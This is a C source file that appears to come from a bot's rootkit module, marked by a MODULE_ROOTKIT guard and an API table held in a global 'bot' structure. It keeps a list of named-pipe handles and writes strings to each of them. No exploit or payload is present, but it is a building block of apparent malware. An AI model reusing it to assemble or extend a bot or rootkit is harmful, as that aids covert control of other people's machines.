/*
	Pipe connection handler.
*/
#include "pipes.h"

#ifdef MODULE_ROOTKIT
#include "string.h"
#include "mem.h"

extern bot_t bot;

static HANDLE* phPipes = NULL;
static DWORD dwPipeCount = 0;

void WINAPI AddPipeToList(HANDLE hPipe)
{
	HANDLE* pNewPipe = NULL;
	DWORD dwIndex = 0;
	unsigned int i;

	for (i = 0; i < dwPipeCount; i++)
	{
		if (phPipes[i] == INVALID_HANDLE_VALUE)
		{
			pNewPipe = &phPipes[i];
			dwIndex = i;
			break;
		}
	}

	if (pNewPipe == NULL && memreallocEx(&phPipes, sizeof(HANDLE) * (dwPipeCount + 1)))
	{
		dwIndex = dwPipeCount++;
		pNewPipe = &phPipes[dwIndex];
	}

	if (pNewPipe != NULL)
	{
		*pNewPipe = hPipe;
	}
}

static DWORD _FindPipe(HANDLE hPipe)
{
	unsigned int i;
	
	for (i = 0; i < dwPipeCount; i++)
	{
		if (phPipes[i] == hPipe)
			return i;
	}

	return -1;
}

void WINAPI RemovePipeFromList(HANDLE hPipe)
{
	DWORD dwIndex, dwNewCount;
	HANDLE* pPipe;

	if ((dwIndex = _FindPipe(hPipe)) == -1)
		return;

	pPipe = &phPipes[dwIndex];
	*pPipe = INVALID_HANDLE_VALUE;

	dwNewCount = dwPipeCount;

	while (dwNewCount > 0 && phPipes[dwNewCount - 1] == INVALID_HANDLE_VALUE) dwNewCount--;

	if (dwNewCount != dwPipeCount)
	{
		if (dwNewCount == 0)
		{
			memfree(phPipes);
			phPipes = NULL;
		}
		else memreallocEx(&phPipes, sizeof(HANDLE) * dwNewCount);
		
		dwPipeCount = dwNewCount;
	}
}

BOOL WINAPI SendDataToPipe(HANDLE hPipe, const LPSTR pszData)
{
	DWORD dwWritten;

	return bot.api.pWriteFile(hPipe, pszData, StrLengthA(pszData), &dwWritten, NULL);
}

void WINAPI SendToAllPipes(const LPSTR pszData)
{
	unsigned int i;

	for (i = 0; i < dwPipeCount; i++)
	{
		if (phPipes[i] != INVALID_HANDLE_VALUE)
		{
			SendDataToPipe(phPipes[i], pszData);
		}
	}
}
#endif